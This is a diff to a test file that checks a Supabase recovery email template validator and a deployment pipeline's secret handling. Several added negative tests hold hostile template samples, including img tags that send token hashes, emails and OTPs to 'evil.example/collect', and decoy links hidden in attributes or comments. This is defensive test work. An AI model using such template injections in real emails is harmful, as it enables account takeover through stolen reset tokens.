@@ -44,18 +44,63 @@ describe('repository Auth redirect contract', () => {
     expect(localConfig).toContain('[auth.email.template.recovery]');
     expect(localConfig).toContain('content_path = "./supabase/templates/recovery.html"');
     expect(localConfig).toContain('otp_expiry = 3600');
-    expect(pipeline.match(/RECOVERY_TEMPLATE_PATH: supabase\/templates\/recovery\.html/g)).toHaveLength(2);
+    expect(pipeline.match(/RECOVERY_TEMPLATE_PATH: supabase\/templates\/recovery\.html/g)).toHaveLength(1);
     expect(pipeline.match(/EMAIL_OTP_EXPIRY_SECONDS: "3600"/g)).toHaveLength(2);
     expect(isSafeRecoveryTemplate(recoveryTemplate)).toBe(true);
+
+    const productionDeploy = pipeline.indexOf('- name: Deploy Vercel production');
+    const productionTemplate = pipeline.indexOf(
+      '- name: Activate recovery token-hash template in production',
+    );
+    expect(pipeline).not.toContain('Activate recovery token-hash template in preview');
+    expect(productionDeploy).toBeGreaterThan(-1);
+    expect(productionTemplate).toBeGreaterThan(productionDeploy);
+
+    const productionJob = pipeline.slice(pipeline.indexOf('  deploy-vercel:'));
+    const productionJobEnv = productionJob.slice(
+      productionJob.indexOf('    env:'),
+      productionJob.indexOf('\n\n    steps:'),
+    );
+    expect(productionJobEnv).not.toContain('SUPABASE_ACCESS_TOKEN');
+    expect(productionJob.match(/SUPABASE_ACCESS_TOKEN: \$\{\{ secrets\.SUPABASE_ACCESS_TOKEN \}\}/g))
+      .toHaveLength(2);
   });
 });
 
 describe('recovery email template contract', () => {
-  it('requires the provider confirmation URL instead of a hardcoded callback', () => {
-    expect(isSafeRecoveryTemplate('<a href="{{ .ConfirmationURL }}">reset</a>')).toBe(true);
-    expect(isSafeRecoveryTemplate('<a href="{{.ConfirmationURL}}">reset</a>')).toBe(true);
+  it('requires the dedicated callback with token hash and recovery type', () => {
+    expect(isSafeRecoveryTemplate(
+      '<a href="{{ .RedirectTo }}?token_hash={{ .TokenHash }}&type=recovery">reset</a>',
+    )).toBe(true);
+    expect(isSafeRecoveryTemplate('<a href="{{ .ConfirmationURL }}">reset</a>')).toBe(false);
+    expect(isSafeRecoveryTemplate(
+      '<a href="{{ .RedirectTo }}?token_hash={{ .TokenHash }}&type=signup">reset</a>',
+    )).toBe(false);
     expect(isSafeRecoveryTemplate('<a href="{{ .SiteURL }}/auth/callback">reset</a>')).toBe(false);
     expect(isSafeRecoveryTemplate('<a href="https://iconsip.com/auth/callback">reset</a>')).toBe(false);
+    expect(isSafeRecoveryTemplate(
+      '<p>{{ .RedirectTo }}</p><a href="https://evil.example/reset?token_hash={{ .TokenHash }}&type=recovery">reset</a>',
+    )).toBe(false);
+    expect(isSafeRecoveryTemplate(
+      '<a href="{{ .RedirectTo }}?token_hash={{ .TokenHash }}&type=recovery">reset</a>'
+      + '<img src="https://evil.example/collect?token_hash={{ .TokenHash }}">',
+    )).toBe(false);
+    expect(isSafeRecoveryTemplate(
+      '<a href="{{ .redirectto }}?token_hash={{ .tokenhash }}&type=recovery">reset</a>',
+    )).toBe(false);
+    expect(isSafeRecoveryTemplate(
+      '<p data-href="{{ .RedirectTo }}?token_hash={{ .TokenHash }}&type=recovery">reset</p>',
+    )).toBe(false);
+    expect(isSafeRecoveryTemplate(
+      '<a title="decoy href=\'{{ .RedirectTo }}?token_hash={{ .TokenHash }}&type=recovery\'">reset</a>',
+    )).toBe(false);
+    expect(isSafeRecoveryTemplate(
+      '<a <!-- href="{{ .RedirectTo }}?token_hash={{ .TokenHash }}&type=recovery" -->>reset</a>',
+    )).toBe(false);
+    expect(isSafeRecoveryTemplate(
+      '<a href="{{ .RedirectTo }}?token_hash={{ .TokenHash }}&type=recovery">reset</a>'
+      + '<img src="https://evil.example/collect?email={{ .Email }}&otp={{ .Token }}">',
+    )).toBe(false);
   });
 });
 
@@ -208,7 +253,7 @@ describe('isSatisfied', () => {
   });
 
   it('version-controlled recovery template가 다르면 통과하지 않는다', () => {
-    const recoveryTemplate = '<a href="{{ .ConfirmationURL }}">reset</a>';
+    const recoveryTemplate = '<a href="{{ .RedirectTo }}?token_hash={{ .TokenHash }}&type=recovery">reset</a>';
 
     expect(isSatisfied({
       ...args,
